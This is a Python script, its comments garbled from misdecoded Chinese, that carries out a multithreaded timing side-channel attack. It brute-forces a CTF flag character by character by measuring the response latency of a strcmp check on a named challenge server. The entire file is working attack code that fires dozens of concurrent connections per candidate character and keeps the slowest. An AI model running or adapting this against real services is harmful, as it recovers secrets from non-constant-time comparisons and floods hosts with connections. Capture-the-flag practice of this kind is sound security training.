#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
å¤šçº¿ç¨‹æ—¶é—´ä¾§ä¿¡é“æ”»å‡»è„šæœ¬
ä½¿ç”¨çº¿ç¨‹æ± å¹¶å‘æµ‹è¯•å­—ç¬¦ï¼Œæé«˜çˆ†ç ´é€Ÿåº¦
"""

import socket
import time
import string
import statistics
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

class TimingAttacker:
    def __init__(self):
        self.host = "strcmp.chall.edgesecurity.team"
        self.port = 1341
        self.charset = string.ascii_letters + string.digits + "_-!@#$%^&*()"
        
    def connect_and_test(self, test_string):
        """å°è£…çš„æœåŠ¡å™¨é€šä¿¡å‡½æ•°"""
        sock = None
        try:
            # å»ºç«‹è¿æ¥
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # å…è®¸åœ°å€é‡ç”¨
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            
            # æ¸…ç†åˆå§‹å“åº”
            try:
                sock.settimeout(0.5)
                sock.recv(4096)
            except socket.timeout:
                pass
            
            # æµ‹é‡æ—¶é—´
            start_time = time.perf_counter()
            sock.send((test_string + "\n").encode('utf-8'))
            
            try:
                sock.settimeout(2)
                response = sock.recv(4096)
            except socket.timeout:
                response = b""
            
            end_time = time.perf_counter()
            elapsed = end_time - start_time
            
            # è¿”å›ç»“æœ
            return {
                'test_string': test_string,
                'time': elapsed,
                'success': True,
                'response': response.decode() if response else ""
            }
            
        except Exception as e:
            return {
                'test_string': test_string,
                'time': 0,
                'success': False,
                'error': str(e)
            }
        finally:
            if sock:
                try:
                    sock.shutdown(socket.SHUT_RDWR)  # æ­£ç¡®å…³é—­è¿æ¥
                    sock.close()
                except:
                    pass
            time.sleep(0.01)  # å°å»¶è¿Ÿé¿å…è¿æ¥å†²çª
    
    def measure_char_timing_multithreaded(self, base_string, char, num_samples=100):
        """å¤šçº¿ç¨‹æµ‹é‡å•ä¸ªå­—ç¬¦çš„æ—¶é—´"""
        test_string = base_string + char
        
        # ä½¿ç”¨çº¿ç¨‹æ± å¹¶å‘æµ‹è¯•
        times = []
        with ThreadPoolExecutor(max_workers=24) as executor:
            # æäº¤æ‰€æœ‰ä»»åŠ¡
            futures = [executor.submit(self.connect_and_test, test_string) 
                      for _ in range(num_samples)]
            
            # æ”¶é›†ç»“æœ
            for future in as_completed(futures):
                result = future.result()
                if result['success'] and 0.08 < result['time'] < 0.15:
                    times.append(result['time'])
        
        # è®¡ç®—ç»Ÿè®¡ä¿¡æ¯
        if len(times) >= 3:
            # å»æ‰æå€¼
            times_sorted = sorted(times)
            if len(times) >= 5:
                times = times_sorted[1:-1]  # å»æ‰æœ€é«˜å’Œæœ€ä½
            
            avg_time = statistics.mean(times)
            std_dev = statistics.stdev(times) if len(times) > 1 else 0
            return avg_time, std_dev, len(times)
        elif times:
            return statistics.mean(times), 0, len(times)
        else:
            return None, 0, 0  # è¿”å›Noneè€Œä¸æ˜¯0ï¼Œæ›´æ˜ç¡®è¡¨ç¤ºå¤±è´¥
    
    def bruteforce_position_parallel(self, current_flag, excluded_chars=None):
        """å¹¶è¡Œçˆ†ç ´å½“å‰ä½ç½®çš„å­—ç¬¦"""
        print(f"\n{'='*60}")
        print(f"å¹¶è¡Œçˆ†ç ´ä½ç½® {len(current_flag)} (å½“å‰: '{current_flag}')")
        
        # è¿‡æ»¤æ‰å·²ç»å°è¯•è¿‡çš„å­—ç¬¦
        charset_to_test = self.charset
        if excluded_chars:
            charset_to_test = [c for c in self.charset if c not in excluded_chars]
            print(f"æ’é™¤å­—ç¬¦: {excluded_chars}")
        
        print(f"æµ‹è¯•å­—ç¬¦é›†: {len(charset_to_test)} ä¸ªå­—ç¬¦")
        print(f"{'='*60}")
        
        char_results = {}
        
        # ä½¿ç”¨çº¿ç¨‹æ± å¹¶è¡Œæµ‹è¯•æ‰€æœ‰å­—ç¬¦
        with ThreadPoolExecutor(max_workers=32) as executor:
            # ä¸ºæ¯ä¸ªå­—ç¬¦åˆ›å»ºä»»åŠ¡
            future_to_char = {
                executor.submit(self.measure_char_timing_multithreaded, current_flag, char): char
                for char in charset_to_test
            }
            
            # æ”¶é›†ç»“æœ
            completed = 0
            total = len(charset_to_test)
            
            for future in as_completed(future_to_char):
                char = future_to_char[future]
                avg_time, std_dev, sample_count = future.result()
                char_results[char] = {
                    'avg_time': avg_time,
                    'std_dev': std_dev,
                    'sample_count': sample_count
                }
                
                completed += 1
                progress = completed / total * 100
                # print(f"  [{progress:5.1f}%] å®Œæˆå­—ç¬¦ '{char}': {avg_time:.6f}s (Â±{std_dev:.6f}s, n={sample_count})")
        
        # åˆ†æç»“æœ
        valid_results = {}
        for char, data in char_results.items():
            if data['sample_count'] >= 3 and data['avg_time'] > 0:
                valid_results[char] = data['avg_time']
        
        if not valid_results:
            print("  âŒ æ²¡æœ‰æœ‰æ•ˆçš„æµ‹é‡ç»“æœ")
            return None, 0, 0, char_results
        
        # æ’åºç»“æœï¼Œè¿”å›å®Œæ•´çš„å€™é€‰åˆ—è¡¨
        sorted_chars = sorted(valid_results.items(), key=lambda x: x[1], reverse=True)
        
        print(f"\nå‰10ä¸ªå€™é€‰ (åŸºäº {len(valid_results)} ä¸ªæœ‰æ•ˆæµ‹é‡):")
        for i, (char, avg_time) in enumerate(sorted_chars[:10], 1):
            data = char_results[char]
            print(f"  {i:2d}. '{char}': {avg_time:.6f}s (Â±{data['std_dev']:.6f}s, n={data['sample_count']})")
        
        # è¿”å›æœ€ä½³é€‰æ‹©å’Œæ‰€æœ‰å€™é€‰
        best_char = sorted_chars[0][0]
        best_time = sorted_chars[0][1]
        second_best_time = sorted_chars[1][1] if len(sorted_chars) > 1 else 0
        time_diff = best_time - second_best_time
        
        print(f"\n  âœ… æœ€ä½³é€‰æ‹©: '{best_char}' ({best_time:.6f}s)")
        if second_best_time > 0:
            print(f"  ğŸ“Š æ—¶é—´å·®å¼‚: {time_diff:.6f}s ({time_diff/best_time*100:.2f}%)")
        
        return best_char, best_time, time_diff, sorted_chars
    
    def parallel_timing_attack(self):
        """æ‰§è¡Œå¹¶è¡Œæ—¶é—´ä¾§ä¿¡é“æ”»å‡»ï¼Œä»å·²çŸ¥éƒ¨åˆ†ç»§ç»­ç›´åˆ°æ‰¾åˆ°}"""
        print("=== å¹¶è¡Œæ—¶é—´ä¾§ä¿¡é“æ”»å‡» ===")
        
        # ä»å¤´å¼€å§‹è®¡ç®—
        current_flag = "EdgeCTF{"
        print(f"èµ·å§‹å‰ç¼€: '{current_flag}' (é•¿åº¦: {len(current_flag)})")
        print("ä»å¤´å¼€å§‹æ”»å‡»ï¼Œç›´åˆ°æ‰¾åˆ°}å­—ç¬¦...")
        
        max_length = 80  # å¢åŠ æœ€å¤§é•¿åº¦ï¼Œä»¥é˜²flagæ›´é•¿
        
        for position in range(len(current_flag), max_length):
            print(f"\nå½“å‰è¿›åº¦: {position}/{max_length} - ä½ç½® {position}")
            
            # å¹¶è¡Œçˆ†ç ´å½“å‰ä½ç½®
            result = self.bruteforce_position_parallel(current_flag)
            
            if len(result) == 4:
                best_char, best_time, time_diff, sorted_candidates = result
            else:
                best_char, best_time, time_diff = result
                sorted_candidates = []
            
            if best_char is None:
                print("  âŒ çˆ†ç ´å¤±è´¥ï¼Œåœæ­¢æ”»å‡»")
                break
            
            # ç›´æ¥æ¥å—æœ€ä½³å­—ç¬¦ï¼ˆç®€åŒ–éªŒè¯ï¼‰
            current_flag += best_char
            print(f"  ğŸš€ æ›´æ–°flag: '{current_flag}'")
            print(f"  ğŸ“Š å½“å‰å­—ç¬¦: '{best_char}' (æ—¶é—´: {best_time:.6f}s, å·®å¼‚: {time_diff:.6f}s)")
            
            # æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°ç»“æŸç¬¦
            if best_char == '}':
                print(f"\nğŸ‰ æ‰¾åˆ°å®Œæ•´flag: {current_flag}")
                break
        
        return current_flag
    
    def verify_flag(self, flag):
        """éªŒè¯flagæ˜¯å¦æ­£ç¡®"""
        print(f"\n{'='*60}")
        print(f"éªŒè¯flag: {flag}")
        print(f"{'='*60}")
        
        result = self.connect_and_test(flag)
        
        if result['success']:
            response = result['response'].lower()
            print(f"æœåŠ¡å™¨å“åº”: {result['response'].strip()}")
            print(f"å“åº”æ—¶é—´: {result['time']:.6f}s")
            
            # æ£€æŸ¥æˆåŠŸæŒ‡ç¤ºè¯
            if any(word in response for word in ['correct', 'congratulations', 'success', 'well done', 'accepted']):
                print("ğŸ‰ éªŒè¯æˆåŠŸï¼æ‰¾åˆ°æ­£ç¡®çš„flag!")
                return True
            elif any(word in response for word in ['incorrect', 'wrong', 'try again']):
                print("âŒ flagä¸æ­£ç¡®")
                return False
            else:
                print("âš ï¸  æœªçŸ¥å“åº”ç±»å‹")
                return False
        else:
            print(f"âŒ éªŒè¯å¤±è´¥: {result.get('error', 'Unknown error')}")
            return False
    
    def test_flag_variations(self, base_flag):
        """æµ‹è¯•flagçš„ä¸åŒå˜ä½“"""
        variations = [
            base_flag,
            base_flag + "}",
        ]
        
        for flag in variations:
            print(f"\næµ‹è¯•flagå˜ä½“: {flag}")
            if self.verify_flag(flag):
                return flag
        
        return None

def main():
    print("å¤šçº¿ç¨‹æ—¶é—´ä¾§ä¿¡é“æ”»å‡» - strcmp(flag)")
    print("=" * 60)
    
    attacker = TimingAttacker()
    
    # æ‰§è¡Œæ”»å‡»
    found_flag = attacker.parallel_timing_attack()
    
    if found_flag:
        print(f"\nğŸ“‹ æ‰¾åˆ°çš„flag: {found_flag}")
        
        # æµ‹è¯•flagçš„ä¸åŒå˜ä½“
        correct_flag = attacker.test_flag_variations(found_flag)
        
        if correct_flag:
            print(f"\nğŸ‰ æœ€ç»ˆæ­£ç¡®çš„flag: {correct_flag}")
        else:
            print(f"\nâŒ æ‰€æœ‰flagå˜ä½“éƒ½ä¸æ­£ç¡®")
    else:
        print("âŒ æœªèƒ½æ‰¾åˆ°flag")

if __name__ == "__main__":
    main()
